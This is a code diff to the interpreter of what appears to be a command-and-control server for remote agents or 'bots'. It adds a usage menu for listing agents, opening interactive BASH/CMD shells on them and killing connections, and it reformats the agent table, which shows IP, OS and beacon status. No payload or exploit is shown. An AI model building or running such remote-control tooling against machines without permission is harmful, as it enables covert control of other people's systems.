@@ -14,8 +14,12 @@ class Interpreter(threading.Thread):
         self.listeners = listeners
 
     def run(self):
-        # Start of a command history implementation, put on hold by fuuuuucking queueueueueues
+        # Start of a command history implementation, put on hold by stuff
         # cmd_history = []
+
+        self.printUsage()
+
+
 
         while True:
 
@@ -82,6 +86,25 @@ class Interpreter(threading.Thread):
                 # for conn in activeConnections:                                         # for i in range(len(allConnections)):
                 #     time.sleep(0.1)
                 #     conn.execute(cmd)
+#------------------------------------------------------------------------------------------------------------------------------
+    def printUsage(self):
+        print("[* Interpreter-Msg] Usage information:\n")
+        print("[+ COMMANDS +]")
+        print("                    - exit          : Exits the program; Causes agents to sleep and retry every 10-45 seconds")
+        print("                    - clear         : Clears the screen; Presents a fresh terminal")
+        print("                    - list-agents   : Lists all active agents in use")
+        print("                    - interact <id> : Opens an interactive BASH/CMD prompt on the selected bot")
+        print("                    - kill <id>     : Kill a connection to a specific bot. Causes bot process to exit. Will not recur. ")
+        print("                    - interact <id> : Opens an interactive BASH/CMD prompt on the selected bot")
+        print("                    - interact <id> : Opens an interactive BASH/CMD prompt on the selected bot")
+        
+
+
+
+        print("                       + Commands:")
+
+        print("[* Interpreter-Msg] Enter QUIT into the terminal to exit batch-mode \n\n")
+
 #------------------------------------------------------------------------------------------------------------------------------
     def batchMode(self):
  
@@ -169,15 +192,15 @@ class Interpreter(threading.Thread):
         os._exit(0)
 #------------------------------------------------------------------------------------------------------------------------------
     def listAgents(self): # Change to listAlive(self)
-        print("       .------------------.                               ")
-        print("       |  LIST OF AGENTS  |                               ")
-        print(".------:------------------:--------.--------.------.--------.")
-        print("|  ID  |  IP ADDRESS (v4) |  PORT  |   OS   | PING | BEACON |")
-        print(":------:------------------:--------:--------:------:--------:")
+        print("       .------------------.                                    ")
+        print("       |  LIST OF AGENTS  |                                    ")
+        print(".------:------------------:--------.----------.------.--------.")
+        print("|  ID  |  IP ADDRESS (v4) |  PORT  |    OS    | PING | BEACON |")
+        print(":------:------------------:--------:----------:------:--------:")
 
         for agent in self.agentList:
-            print("| %4d | %16s | %6d | %4s | %6s |"% (agent.getID(), agent.getIP(), agent.getPort(),agent.getOS() agent.status[0], agent.status[1]))
-            print(":------:------------------:--------:--------:------:--------:")
+            print("| %4d | %16s | %6d | %9s | %4s | %6s |"% (agent.getID(), agent.getIP(), agent.getPort(), agent.getOS(), agent.status[0], agent.status[1]))
+            print(":------:------------------:--------:----------:------:--------:")
 #------------------------------------------------------------------------------------------------------------------------------
     def interact(self, id):
         # print("Shell function entry point")
